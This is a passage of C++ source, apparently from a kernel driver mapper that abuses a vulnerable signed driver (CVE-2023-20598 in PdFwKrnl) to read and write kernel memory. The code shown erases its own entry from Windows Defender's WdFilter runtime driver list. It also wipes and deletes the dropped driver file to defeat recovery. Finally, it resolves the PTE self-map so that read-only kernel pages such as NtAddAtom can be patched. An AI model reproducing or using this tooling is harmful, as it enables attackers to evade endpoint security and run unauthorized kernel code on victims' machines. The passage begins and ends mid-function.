		Log(L"[INFO] WdFilter runtime driver array is not a kernel pointer, clear skipped" << std::endl);
		return true;
	}

	if (reinterpret_cast<uintptr_t>(list_head.Flink) < 0xFFFF000000000000ULL ||
		reinterpret_cast<uintptr_t>(list_head.Blink) < 0xFFFF000000000000ULL) {
		Log(L"[INFO] WdFilter runtime driver list head links are not kernel pointers, clear skipped" << std::endl);
		return true;
	}

	RuntimeDriversArray = list_array;

	uintptr_t MpFreeDriverInfoEx = SymbolsHandler::GetInstance()->GetOffset(L"MpFreeDriverInfoEx");
	if (!MpFreeDriverInfoEx)
	{
		Log("[INFO] WdFilter offsets unavailable, clear skipped" << std::endl);
		return true;
	}
	MpFreeDriverInfoEx += WdFilter;

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Useful lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	//Validate the array backing before any per-slot read. Only the pointer's
	//range was checked above, not the list_count*8 bytes it must hold; a short
	//allocation would turn the search below into up to list_count faulting
	//reads. The array is one contiguous allocation, so probing its first and
	//last slot proves the whole range.
	if (list_count > 0) {
		const uint64_t total_array_bytes = static_cast<uint64_t>(list_count) * sizeof(uint64_t);
		const uint64_t array_end = list_array + total_array_bytes;
		if (total_array_bytes > static_cast<uint64_t>(kMaxWdFilterRuntimeDrivers) * sizeof(uint64_t) ||
			array_end < list_array ||
			!IsKernelAddress(array_end - 1) ||
			!ProbeKernelRangeMapped(list_array, sizeof(uint64_t)) ||
			!ProbeKernelRangeMapped(array_end - sizeof(uint64_t), sizeof(uint64_t))) {
			Log(L"[INFO] WdFilter runtime driver array backing is not fully mapped, clear skipped" << std::endl);
			return true;
		}
	}

	//Every entry is validated before it is unlinked. The walk is bounded by
	//the count the structure itself reports and every address is probed with
	//MmIsAddressValid before the provider touches it: a corrupted head
	//previously sent the walk into unmapped kernel memory where the read
	//faulted inside the provider (bugcheck 0x50), and a circular corruption
	//looped forever. Both are refused cleanly now.
	ULONG walk_steps = 0;
	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		if (++walk_steps > list_count) {
			Log(L"[INFO] WdFilter runtime driver list walk exceeded its reported count, clear skipped" << std::endl);
			return true;
		}
		if (!Entry || !IsKernelAddress(reinterpret_cast<uint64_t>(Entry)))
		{
			//A null or non-kernel entry means the list does not match this build.
			//Nothing has been written, so skip rather than failing the mapping.
			Log("[INFO] WdFilter runtime driver list entry is not a kernel pointer, clear skipped" << std::endl);
			return true;
		}
		if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(Entry), sizeof(LIST_ENTRY))) {
			Log("[INFO] WdFilter runtime driver list entry is not mapped, clear skipped" << std::endl);
			return true;
		}

		//The WdFilter entry layout is not a public UDT and WdFilter exports no
		//field offsets, so ci.dll's HashBucketEntry_DriverName (0x8) must not
		//be reused here. Locate the name by content instead: the first
		//UNICODE_STRING around Entry whose buffer ends with this run's driver
		//name at a filename boundary. A match is its own proof.
		uint32_t wd_name_offset = 0;
		UNICODE_STRING Unicode_String = { 0 };
		std::wstring wd_matched_name;
		if (WdFilterFindNameInEntry(reinterpret_cast<uintptr_t>(Entry), Driver::GetDriverNameW(), wd_name_offset, Unicode_String, wd_matched_name)) {
			if (((uint64_t)Unicode_String.Buffer) < 0xFFFF000000000000ULL ||
				Unicode_String.Length == 0 ||
				Unicode_String.Length > 1024 ||
				Unicode_String.Length % sizeof(wchar_t) != 0 ||
				Unicode_String.MaximumLength < Unicode_String.Length)
				continue;

			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), Driver::GetDriverNameW().c_str())) {

				//Proven entry: its name matched by content at wd_name_offset.
				//Everything else is derived by content before any write.
				//Entry-0x10 alone cannot distinguish a wrong delta that happens
				//to equal a different live entry's pointer, and Entry-0x20 plus
				//0xDA18 alone is a value check, not a layout check. Both are
				//replaced below by unique-in-window discoveries that must agree
				//with each other.
				uintptr_t driver_info = 0;
				if (!WdFilterFindDriverInfo(reinterpret_cast<uintptr_t>(Entry), driver_info)) {
					Log("[INFO] WdFilter driver-info magic not uniquely locatable, clear skipped (no kernel write)" << std::endl);
					return true;
				}

				//Discover the array base instead of assuming Entry-0x10: the
				//array holds bases and the list holds entries inside those
				//bases, so the base belonging to Entry must be the unique array
				//value at or just before Entry. Bounded by the count the
				//structure itself reports rather than by a fixed 256.
				ULONG array_index = 0;
				uint64_t array_base = 0;
				uint32_t base_hits = 0;
				const uint64_t entry_addr = reinterpret_cast<uint64_t>(Entry);
				for (ULONG k = 0; k < list_count; k++) {
					PVOID value = 0;
					const uint64_t slot = RuntimeDriversArray + static_cast<uint64_t>(k) * sizeof(PVOID);
					//Backing was proven above, but the result is still checked:
					//a failed read means no match this iteration is unsafe to
					//assume, so abort without writing.
					if (!ReadMemory(slot, &value, sizeof(value))) {
						Log(L"[INFO] Could not read WdFilter runtime array slot, clear skipped" << std::endl);
						return true;
					}
					const uint64_t v = reinterpret_cast<uint64_t>(value);
					if (!IsKernelAddress(v))
						continue;
					if (v > entry_addr)
						continue;
					const uint64_t delta = entry_addr - v;
					if (delta > kWdFilterMaxBaseDelta)
						continue;
					if (!ProbeKernelRangeMapped(v, delta + sizeof(LIST_ENTRY)))
						continue;
					//Structural ordering: info < base <= entry. A build with
					//the info elsewhere that merely has 0xDA18 at some other
					//offset still fails unless the whole triple lines up.
					if (v <= driver_info)
						continue;
					if (driver_info >= entry_addr)
						continue;
					if (++base_hits > 1)
						break;
					array_index = k;
					array_base = v;
				}
				if (base_hits != 1) {
					Log("[INFO] WdFilter array base not uniquely locatable for this entry, clear skipped (no kernel write)" << std::endl);
					return true;
				}

				//Validate both neighbours before writing through them. A null
				//or unmapped link previously became a write to kernel 0x8
				//(instant bugcheck) because ReadListEntry returns 0 on read
				//failure and the writes discarded their own results.
				uint64_t next_raw = 0;
				uint64_t prev_raw = 0;
				const uint64_t entry_flink_addr = entry_addr + offsetof(LIST_ENTRY, Flink);
				const uint64_t entry_blink_addr = entry_addr + offsetof(LIST_ENTRY, Blink);
				if (!ProbeKernelRangeMapped(entry_flink_addr, sizeof(uint64_t)) ||
					!ProbeKernelRangeMapped(entry_blink_addr, sizeof(uint64_t)) ||
					!ReadMemory(entry_flink_addr, &next_raw, sizeof(next_raw)) ||
					!ReadMemory(entry_blink_addr, &prev_raw, sizeof(prev_raw))) {
					Log(L"[INFO] Could not read WdFilter list neighbours, clear skipped" << std::endl);
					return true;
				}
				if (!IsKernelAddress(next_raw) || !IsKernelAddress(prev_raw)) {
					Log(L"[INFO] WdFilter list neighbours are not kernel pointers, clear skipped" << std::endl);
					return true;
				}
				const uint64_t next_blink_addr = next_raw + offsetof(LIST_ENTRY, Blink);
				const uint64_t prev_flink_addr = prev_raw + offsetof(LIST_ENTRY, Flink);
				if (!ProbeKernelRangeMapped(next_blink_addr, sizeof(uint64_t)) ||
					!ProbeKernelRangeMapped(prev_flink_addr, sizeof(uint64_t))) {
					Log(L"[INFO] WdFilter neighbour link fields are not mapped, clear skipped" << std::endl);
					return true;
				}
				LIST_ENTRY* NextEntry = reinterpret_cast<LIST_ENTRY*>(next_raw);
				LIST_ENTRY* PrevEntry = reinterpret_cast<LIST_ENTRY*>(prev_raw);

				//Unlink first, array second. The old order stamped the array
				//slot before the list was touched, so a half-completed unlink
				//left the array saying "freed" while the list was corrupt in
				//one direction. Every write is checked and a failure after the
				//first write attempts a rollback instead of leaving a
				//half-linked list.
				if (!WriteMemory(next_blink_addr, &PrevEntry, sizeof(PVOID))) {
					Log(L"[-] Failed to unlink WdFilter list (next->Blink), no write completed" << std::endl);
					return false;
				}
				if (!WriteMemory(prev_flink_addr, &NextEntry, sizeof(PVOID))) {
					Log(L"[-] Failed to unlink WdFilter list (prev->Flink), attempting rollback" << std::endl);
					LIST_ENTRY* self = Entry;
					WriteMemory(next_blink_addr, &self, sizeof(PVOID));
					return false;
				}

				/*
				 * The sentinel written into the freed slot. It is the
				 * address of the count field, offset by one so it can
				 * never equal one of the pointers the array holds -
				 * MpFreeDriverInfoEx reads the slot back and compares it
				 * against this value to decide whether the entry is
				 * still live.
				 */
				PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
				const uint64_t target_slot = RuntimeDriversArray + static_cast<uint64_t>(array_index) * sizeof(PVOID);
				//Re-read the slot before stamping it: it must still hold the
				//base this entry was proven against.
				{
					PVOID recheck = 0;
					if (!ReadMemory(target_slot, &recheck, sizeof(recheck)) ||
						reinterpret_cast<uint64_t>(recheck) != array_base) {
						Log(L"[-] WdFilter array slot changed before stamp, attempting list rollback" << std::endl);
						LIST_ENTRY* self = Entry;
						WriteMemory(next_blink_addr, &self, sizeof(PVOID));
						WriteMemory(prev_flink_addr, &self, sizeof(PVOID));
						return false;
					}
				}
				if (!WriteMemory(target_slot, &emptyval, sizeof(PVOID))) {
					Log(L"[-] Failed to stamp WdFilter array slot, attempting list rollback" << std::endl);
					LIST_ENTRY* self = Entry;
					WriteMemory(next_blink_addr, &self, sizeof(PVOID));
					WriteMemory(prev_flink_addr, &self, sizeof(PVOID));
					return false;
				}

				//Decrement the count with checked I/O. A failed read must not
				//fabricate 0 (the old code turned a read failure into current=0
				//->1->0 and wrote 0, silently truncating Defender's count), and
				//a real zero must not wrap to 0xFFFFFFFF.
				ULONG current = 0;
				if (!ReadMemory(RuntimeDriversCount, &current, sizeof(current))) {
					Log(L"[-] Could not re-read WdFilter driver count after unlink, state may be inconsistent" << std::endl);
					return false;
				}
				if (current == 0 || current > kMaxWdFilterRuntimeDrivers) {
					Log(L"[-] WdFilter driver count " << Val(current) << L" is not decrementable, state may be inconsistent" << std::endl);
					return false;
				}
				{
					ULONG decremented = current - 1;
					if (!WriteMemory(RuntimeDriversCount, &decremented, sizeof(decremented))) {
						Log(L"[-] Failed to decrement WdFilter driver count" << std::endl);
						return false;
					}
				}

				//Free the proven header. driver_info was uniquely located by
				//its magic before any write and cross-checked against the
				//array base ordering, so this is not MpFreeDriverInfoEx on a
				//wrong pointer (use-after-free). A failure to run it only leaks
				//the block; the entry is already unlinked, which is the safe
				//half.
				if (!CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, driver_info)) {
					Log(L"[INFO] MpFreeDriverInfoEx did not run, driver-info block leaked (entry already unlinked)" << std::endl);
				}

				Log(L"[+] WdFilterDriverList Cleaned: " << Val(wd_matched_name)
					<< L" | name_off " << Val(Hex(static_cast<int32_t>(wd_name_offset)))
					<< L" | array_idx " << Val(array_index)
					<< L" | base " << Val(reinterpret_cast<void*>(array_base))
					<< L" | info " << Val(reinterpret_cast<void*>(driver_info)) << std::endl);
				return true;
				}
			}
		}
	}
	//Nothing written: the provider was simply not present in WdFilter's list.
	//That is "nothing to clean", not a failure, so the mapping proceeds.
	Log("[INFO] Provider not found in WdFilter runtime list, nothing to clean" << std::endl);
	return true;
}

/*
 * Close the device, and when this process loaded the provider, unload it,
 * delete its service key and overwrite its file on disk.
 *
 * Safe to call more than once and safe to call on a failed Load(): both are
 * idempotent, hDevice guards the close and g_driverWasLoadedByUs guards the
 * teardown.
 *
 * The file is overwritten with random data before being deleted so that its
 * contents are not recoverable from the freed clusters.
 */
/*
 * Upper bound on how much of the dropped provider file is overwritten before it
 * is deleted. The file is the size of the embedded resource, a few tens of
 * kilobytes, so anything far larger means the path was reused for something that
 * is not ours and is left alone rather than overwritten.
 */
static constexpr uintmax_t kMaxDriverOverwriteSize = 64u * 1024u * 1024u;

NTSTATUS Driver::Unload() {
	LogBlank();
	Log(L"[!] Unloading vulnerable driver" << std::endl);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
	}

	//If the driver was already running before we started there is nothing to
	//stop, remove or wipe.
	if (!g_driverWasLoadedByUs)
		return STATUS_SUCCESS;

	/*
	 * The teardown state is cleared here, up front, rather than at the end.
	 *
	 * It used to be left set, so a second Unload re-ran StopAndRemove against a
	 * service key that was already gone and then reported STATUS_DELETE_PENDING
	 * because the file was already gone. The crash handler calls Unload and the
	 * normal path calls it too, so a crash after a successful run got an error
	 * back from a teardown that had in fact completed. Clearing first makes the
	 * second call a no-op on every exit path, including the early returns below.
	 */
	g_driverWasLoadedByUs = false;

	const NTSTATUS service_status = Service::StopAndRemove(GetDriverNameW());
	if (!NT_SUCCESS(service_status)) {
		/*
		 * Reported, but deliberately not returned from, and the wipe below is
		 * attempted anyway rather than skipped.
		 *
		 * The previous version returned here, which skipped the overwrite and the
		 * unlink entirely and left %TEMP%\<name> on disk holding a complete,
		 * signed, loadable driver.
		 */
		Log(L"[-] Failed to stop and remove the provider service ("
			<< Val(Hex(service_status)) << L"); continuing so the dropped file is still wiped" << std::endl);
	}
	LogBlank();

	std::wstring driver_path = GetDriverPath();

	/*
	 * Overwrite the provider's bytes in place before unlinking it.
	 *
	 * The previous version opened the file with trunc, which frees the original
	 * clusters before a single byte is written and then allocates new ones for the
	 * longer random buffer that followed. The result was that the original image
	 * was left intact on disk, and the clusters holding it were released by the
	 * truncate rather than by the delete - the opposite of what the comment above
	 * it claimed.
	 *
	 * Opening for read/write without truncating, and writing exactly as many
	 * bytes as the file already holds, overwrites the clusters the image
	 * occupies: the MFT record keeps pointing at them, and the new bytes land on
	 * them. The delete that follows then releases clusters that no longer
	 * contain the original content.
	 *
	 * This only works once the driver is unloaded, and that is not something this
	 * function can arrange. The I/O manager holds a loaded image open sharing
	 * read access only, so the open below fails with ERROR_SHARING_VIOLATION for
	 * as long as the provider is resident - verified on a run where NtUnloadDriver
	 * returned STATUS_UNLOAD_FAILED and the file survived untouched. That is not a
	 * failure of the wipe, it is a statement that the driver is still loaded, and
	 * it is reported as such because the two need very different responses.
	 */
	std::error_code size_error;
	const auto original_size = std::filesystem::file_size(driver_path, size_error);

	//Whether the bytes on disk were actually destroyed. False at the end means
	//the image may still be recoverable from %TEMP%.
	bool wiped = false;

	if (size_error || original_size == 0) {
		//"not there" and "there but its size is unreadable" are different
		//outcomes. The first means the unlink below has nothing to do and must not
		//be reported as a failure; the second means the bytes may still be on disk.
		std::error_code exists_error;
		if (size_error && !std::filesystem::exists(driver_path, exists_error)) {
			Log(L"[INFO] The provider file is already gone, nothing to wipe" << std::endl);
			return service_status;
		}
		Log(L"[-] Can't determine the size of the driver file, skipping the overwrite before unlink" << std::endl);
	}
	else if (original_size > kMaxDriverOverwriteSize) {
		Log(L"[-] Driver file is unexpectedly large (" << Val(original_size) << L" Bytes), skipping the overwrite before unlink" << std::endl);
	}
	else {
		//in|out without trunc: the file is not resized, so the write lands on the
		//clusters that already hold the image.
		std::fstream file_stream(driver_path.c_str(), std::ios_base::in | std::ios_base::out | std::ios_base::binary);
		if (!file_stream.is_open()) {
			const DWORD open_error = GetLastError();

			if (open_error == ERROR_SHARING_VIOLATION) {
				//The one failure here with a known cause and a known remedy.
				Log(L"[-] Cannot overwrite the provider file: it is still held open by the loaded driver"
					<< L" (error " << Val(static_cast<unsigned long>(open_error)) << L")" << std::endl);
				Log(L"[-] The provider is still resident in kernel memory; its image cannot be wiped"
					<< L" until that driver unloads." << std::endl);
			}
			else {
				Log(L"[-] Error opening driver file to dump random data inside the disk"
					<< L" (error " << Val(static_cast<unsigned long>(open_error)) << L")" << std::endl);
			}
		}
		else {
			auto random_data = std::make_unique<BYTE[]>(static_cast<size_t>(original_size));
			//Same 0..255 byte range as the rand() version, drawn from the shared
			//engine so the overwrite is not predictable from the name it shares a
			//seed with.
			auto& engine = RandomEngine();
			std::uniform_int_distribution<int> byte_dist(0, 255);
			for (size_t i = 0; i < static_cast<size_t>(original_size); ++i)
				random_data[i] = static_cast<BYTE>(byte_dist(engine));

			file_stream.write(reinterpret_cast<const char*>(random_data.get()), original_size);
			file_stream.flush();
			file_stream.close();

			if (!file_stream) {
				Log(L"[-] Error dumping random data over the driver file" << std::endl);
			}
			else {
				wiped = true;
				Log(L"[+] Vulnerable driver data destroyed before unlink." << std::endl);
			}
		}
	}

	//unlink the file
	//
	//std::filesystem::remove rather than _wremove, because _wremove cannot tell
	//"deleted" from "was not there": a second teardown reported
	//STATUS_DELETE_PENDING for a file it had already removed.
	//
	//Attempted even when the wipe failed. Removing the directory entry still takes
	//the file away by name, and its clusters are unreachable that way even though
	//they keep the content - so "not wiped but removed" is materially better than
	//"not wiped and still there", and is worth the attempt.
	std::error_code remove_error;
	const bool removed = std::filesystem::remove(driver_path, remove_error);

	if (!removed || remove_error) {
		if (remove_error) {
			Log(L"[-] Could not remove the provider file (error "
				<< Val(static_cast<unsigned long>(remove_error.value())) << L")" << std::endl);
		}
		else {
			Log(L"[-] Could not remove the provider file" << std::endl);
		}

		/*
		 * Still there. If the bytes were also not destroyed, or the service
		 * failed, something was left behind and the returned status has to say so:
		 * it is the only way the caller can tell this run from a clean one.
		 */
		if (!wiped && NT_SUCCESS(service_status))
			return STATUS_DELETE_PENDING;

		return service_status;
	}

	if (!wiped) {
		//Removed but not overwritten: the image is gone by name while its clusters
		//still hold it. Said plainly, so the removal does not read as a completed
		//wipe.
		Log(L"[!] The provider file was removed without being overwritten; its clusters still hold the image until they are reused" << std::endl);
	}

	//The service result is returned last, and only matters when it was a failure:
	//a successful wipe of a file whose driver is still resident is not a clean
	//teardown, and the caller has to be able to say so.
	return service_status;
}

bool Driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return false;

	Provider::CopyRequest request{};
	Provider::FillCopyRequest(request, destination, source, size);

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, Provider::kCopyIoctl, &request, sizeof(request), nullptr, 0, &bytes_returned, nullptr) != FALSE;
}

/*
 * Read kernel memory into a user mode buffer.
 *
 * The provider memcpy's without validating either address, so a bad address
 * here faults inside the provider. Callers are responsible for only passing
 * addresses they have resolved or verified.
 */
bool Driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}

//Write a user mode buffer into kernel memory.
//Subject to the same constraint as ReadMemory.
bool Driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

/*
* PTE self-mapping helpers (x64 Windows).
*
* A provider that only exposes a virtual read/write (a plain kernel memcpy,
* e.g. CVE-2023-20598 in PdFwKrnl) cannot write to read-only kernel pages:
* the copy runs with the CPU page permissions applied and faulting in kernel
* context is an instant bugcheck (0x50).
*
* The kernel aliases its own page tables into the system VA range and those PTE
* pages are ordinary writable kernel memory, so a read-only page can be made
* writable from user mode through the provider: read the PTE, set the RW bit,
* clear NX, write, then restore the original PTE.
*
* The self-map window base is a fixed architectural constant (0xFFFFF68000000000
* on every Windows release since Vista - it is what WinDbg's !pte uses), but it
* is still verified here before it is used: a wrong base means either an
* unmapped read (bugcheck) or a kernel memory corruption. The verification reads
* the PTEs of the first pages of ntoskrnl and requires a pair whose page frame
* numbers differ by exactly one. If that fails, read-only writes are disabled
* instead of continuing blind.
*/
static bool g_pteSelfMapReady = false;
static bool g_pteSelfMapProbed = false;
static bool ProbePteSelfMapBase();

/*
 * Internal types whose layout is not in the public PDBs (_PiDDBCacheEntry,
 * HashBucketEntry and the WdFilter driver info) still need field offsets.
 * Instead of trusting a hardcoded number, locate the field by content: scan the
 * object for a UNICODE_STRING that actually contains the string we are looking
 * for. A match is its own proof, so the offset can be trusted afterwards, and a
 * miss is a clean abort instead of a corrupted kernel structure.
 */

//Read the string a UNICODE_STRING points at, after checking that the structure
//itself is plausible: a kernel range pointer, a non zero length that fits the
//field and is a whole number of characters, and a MaximumLength that covers
//the Length. Returns false rather than following a bad pointer.
static bool ReadWideStringField(const UNICODE_STRING& text, std::wstring& out) {
	if (!text.Buffer || text.Length == 0 || text.Length > 512 || (text.Length % sizeof(wchar_t)) != 0)
		return false;
	if ((uint64_t)text.Buffer < 0xFFFF000000000000ULL)
		return false;
	if (text.MaximumLength < text.Length)
		return false;

	auto buffer = std::make_unique<wchar_t[]>((ULONG64)text.Length / 2ULL + 1ULL);
	if (!Driver::ReadMemory((uintptr_t)text.Buffer, buffer.get(), text.Length))
		return false;

	out.assign(buffer.get());
	return true;
}

/*
 * Returned by FindUnicodeStringFieldByContent when the field is not in the
 * object at all.
 *
 * Deliberately not 0: 0 is the offset of the first member of a struct, which is
 * where _DRIVER_EXTENSION.DriverObject really does sit, so reusing 0 as "not
 * found" made a legitimate layout indistinguishable from a failed lookup. The
 * same reasoning is why SymbolsHandler::kFieldUnresolved is ~0ULL and why
 * SymbolEngine::FieldResult::Resolved() exists.
 */
static constexpr uint32_t kFieldNotFound = 0xFFFFFFFFu;

//Offset of a UNICODE_STRING member inside object that holds needle, or
//kFieldNotFound when no member does.
//Scans on pointer alignment, stops at the first structure that cannot be read,
//and only returns an offset whose content matches exactly.
static uint32_t FindUnicodeStringFieldByContent(uint64_t object, size_t object_size, const std::wstring& needle) {
	for (uint32_t offset = 0; offset + sizeof(UNICODE_STRING) <= object_size; offset += sizeof(void*)) {
		UNICODE_STRING candidate = { 0 };
		if (!Driver::ReadMemory(object + offset, &candidate, sizeof(candidate)))
			break;

		std::wstring value;
		if (!ReadWideStringField(candidate, value))
			continue;

		if (value == needle)
			return offset;
	}

	return kFieldNotFound;
}

/*
 * Base of the window Windows maps its own page tables into, resolved at runtime
 * from nt!MmPteBase by ResolveMmPteBase() during Load().
 *
 * It is NOT a compile time constant, and that is not caution, it is a bug that
 * was shipped: 0xFFFFF68000000000 is the value quoted for many Windows builds,
 * but the kernel actually uses a different one. With the wrong base,
 * PteAddressFor returns an address that is not mapped at all, and the provider
 * faults reading it - which is the 0x50 that took a session. Zero means "not
 * resolved yet".
 */
static uint64_t g_mmPteBase = 0;

//The verified self-map base actually used for reads and writes. Set by
//ProbePteSelfMapBase(), which is the only code allowed to choose it.
static uint64_t g_pteSelfMapBase = 0;

//The matching PDE self-map base, derived from g_pteSelfMapBase. Needed because
//large (2 MB) pages have no 4K PTE: their protection lives in the PDE, and the
//4K "PTE" address for such a page aliases the page content instead.
static uint64_t g_pdeSelfMapBase = 0;

/*
 * Index of the PTE for a virtual address, under an explicit self-map base.
 *
 * A virtual address V has its entry at base + ((V >> 12) * 8): shifting by 12
 * gives the page index, and each PTE is 8 bytes. Written as a single shift of 9
 * with the low bits masked off, which is the same thing and needs no 64-bit
 * multiply.
 *
 * The 48-bit mask comes before the shift. A canonical address is 48 bits and the
 * upper bits of a kernel address are only sign extension, so shifting a full
 * 64-bit value first folds those bits into the index.
 *
 * The base is a parameter rather than read from g_pteSelfMapBase because the
 * probe has to compute addresses under the *candidate* base before any base has
 * been verified - see ProbePteSelfMapBase.
 */
static inline uint64_t PteAddressForBase(uint64_t pte_base, uint64_t virtual_address) {
	const uint64_t canonical = virtual_address & 0x0000FFFFFFFFFFFFULL;
	return pte_base + ((canonical >> 12) << 3);
}

//Index of the PTE for a virtual address under the verified self-map base.
//Only valid once ProbePteSelfMapBase has succeeded.
static inline uint64_t PteAddressFor(uint64_t virtual_address) {
	return PteAddressForBase(g_pteSelfMapBase, virtual_address);
}

/*
 * Self-map geometry for the higher page-table levels.
 *
 * The self-map base is the PML4 self-reference index placed in bits 47:39
 * (base = index << 39). The bases for the higher levels are built from the same
 * index OR-ed into successively lower 9-bit fields:
 *
 *   pte_base  = index << 39
 *   pde_base  = pte_base | (index << 30)     // + because the fields do not overlap
 *   pdpt_base = pde_base | (index << 21)
 *   pml4_base = pdpt_base | (index << 12)
 *
 * The PDE for a virtual address V is then pde_base + ((V >> 21) << 3), the same
 * linear shape as the PTE formula one level up. This is the relationship the
 * kernel's own MmIsAddressValidEx relies on.
 */
static inline uint64_t SelfMapIndex(uint64_t pte_base) {
	return (pte_base >> 39) & 0x1FFULL;
}

static inline uint64_t PdeBaseFor(uint64_t pte_base) {
	return pte_base + (SelfMapIndex(pte_base) << 30);
}

//PDE (2 MB leaf) entry for a virtual address under an explicit PDE base.
static inline uint64_t PdeAddressForBase(uint64_t pde_base, uint64_t virtual_address) {
	const uint64_t canonical = virtual_address & 0x0000FFFFFFFFFFFFULL;
	return pde_base + ((canonical >> 21) << 3);
}

//PDE entry for a virtual address under the verified self-map base.
static inline uint64_t PdeAddressFor(uint64_t virtual_address) {
	return PdeAddressForBase(g_pdeSelfMapBase, virtual_address);
}

/*
 * Resolve nt!MmPteBase into g_mmPteBase.
 *
 * MmPteBase is a data symbol in the public ntoskrnl PDB, so this works for any
 * build rather than only the ones a constant happens to be right for. It is a
 * kernel pointer read through the provider, so a failure here is a clean
 * refusal rather than a fallback to a guess.
 *
 * Returns false, leaving g_mmPteBase at 0, when the symbol cannot be
 * resolved or the value read back is not a plausible kernel pointer.
 */
static bool ResolveMmPteBase() {
	if (g_mmPteBase != 0)
		return true;

	const auto pte_base_offset = SymbolsHandler::GetInstance()->GetOffset(L"MmPteBase");
	if (pte_base_offset == 0) {
		Log(L"[-] nt!MmPteBase could not be resolved from symbols" << std::endl);
		return false;
	}

	uint64_t pte_base = 0;
	if (!Driver::ReadMemory(Driver::ntoskrnlAddr + pte_base_offset, &pte_base, sizeof(pte_base))) {
		Log(L"[-] Could not read nt!MmPteBase" << std::endl);
		return false;
	}

	//A self-map base has a fixed shape: the top 16 bits are the kernel half
	//sign extension, bits 38:0 are zero (the base is index << 39), and the
	//PML4 self-reference index lives in bits 47:39 and is a kernel index
	//(0x100..0x1FF). Checking the shape rejects a wrong symbol long before any
	//address computed from it is dereferenced, which is the only failure mode
	//here that can bugcheck: reading nt data is always safe, reading a PTE
	//through a wrong base is not.
	const uint64_t kKernelHalf = 0xFFFF000000000000ULL;
	const uint64_t kLowIndexBits = 0x0000007FFFFFFFFFULL;
	const uint64_t index = (pte_base >> 39) & 0x1FFULL;

	if ((pte_base & kKernelHalf) != kKernelHalf ||
		(pte_base & kLowIndexBits) != 0 ||
		index < 0x100ULL || index > 0x1FFULL) {
		Log(L"[-] nt!MmPteBase held a value that is not a self-map base "
			<< Val(reinterpret_cast<void*>(pte_base)) << L" (index " << Val(Hex(index)) << L")" << std::endl);
		return false;
	}

	g_mmPteBase = pte_base;
	Log(L"[+] nt!MmPteBase holds " << Val(reinterpret_cast<void*>(pte_base)) << std::endl);
	return true;
}

/*
 * Verify the PTE self-map window once per run and cache the result.
 *
 * ResolveMmPteBase has already read the candidate base out of nt!MmPteBase.
 * This proves that base really indexes the kernel's page tables before anything
 * is written through it, using a positive control rather than a statistic.
 *
 * The controls are fixed kernel addresses that are always mapped: the fixed
 * KUSER_SHARED_DATA page, whose 4K PTE must be a present supervisor leaf, and
 * the ntoskrnl image base, whose 2 MB PDE (or 4K PTE, on a build that does not
 * use large pages) must be a present supervisor leaf. Kernel page tables are
 * shared by every process, so the entry read back is the same no matter whose
 * context the provider's copy runs in, and everything the mapper needs to write
 * (the NtAddAtom page in ntoskrnl's read-only .text) is a kernel address anyway.
 *
 * Reading a PTE for a large-page VA returns the page content, not an entry, so
 * the probe checks the PDE for the ntoskrnl image and never treats that content
 * as a PTE - a mistake that an earlier version made and that led straight to a
 * write into the read-only .text page.
 *
 * The addresses are computed with the candidate base explicitly. They cannot use
 * PteAddressFor here: that reads the verified base, which this function is what
 * sets, so during the probe it is still zero and every address computed from it
 * is wrong - that is what made an earlier version report 0 valid entries and
 * disable the read-only write primitive.
 */
static bool ProbePteSelfMapBase() {
	if (g_pteSelfMapProbed)
		return g_pteSelfMapReady;

	g_pteSelfMapProbed = true;
	g_pteSelfMapReady = false;

	if (g_mmPteBase == 0) {
		Log(L"[-] No PTE self-map base candidate is available" << std::endl);
		return false;
	}

	/*
	 * Two independent structural controls, one at each level the write path
	 * uses.
	 *
	 * A 4K leaf: KUSER_SHARED_DATA (0xFFFFF78000000000) is a fixed single page
	 * that is always mapped, so its PTE must be a present supervisor 4K leaf
	 * with a plausible frame number.
	 *
	 * A 2 MB leaf: on this build ntoskrnl's image is mapped with 2 MB large
	 * pages, so its PDE must be a present supervisor large entry (PS=1) with a
	 * plausible frame number. That is the level the NtAddAtom hook has to patch,
	 * and reading the 4K "PTE" for such a page is what aliases the page content
	 * instead of an entry - the earlier probe did that and treated the MZ header
	 * it read back as a PTE. A wrong base cannot produce both a valid 4K PTE for
	 * one fixed VA and a valid 2 MB PDE for another.
	 *
	 * If ntoskrnl is not large-page mapped on some build, its 4K PTE is accepted
	 * instead, so the probe matches whichever mapping the running kernel uses.
	 */

	const uint64_t kUserSharedData = 0xFFFFF78000000000ULL;

	/*
 * Upper bound on a believable page frame number, used when the real figure
 * cannot be read.
 *
 * 2^24 frames is 64 GB of physical memory, comfortably above any machine this
 * runs on and far below the 2^36 a 64-bit frame number can hold - so a PTE that
 * decodes to a frame above it is still refused as a mis-decode. This is a weaker
 * bound than the real one, which is the point: it is a fallback, not a
 * replacement, and it exists so that a failed Win32 call degrades the check
 * rather than removing it.
 */
static constexpr uint64_t kFallbackMaxPfn = 1ULL << 24;

	MEMORYSTATUSEX ms{};
	ms.dwLength = sizeof(ms);
	uint64_t max_pfn = kFallbackMaxPfn;
	if (GlobalMemoryStatusEx(&ms)) {
		const uint64_t reported = ms.ullTotalPhys / 0x1000;
		if (reported > 0)
			max_pfn = reported;
	}
	//The return value used to be discarded. On failure ullTotalPhys stayed at 0,
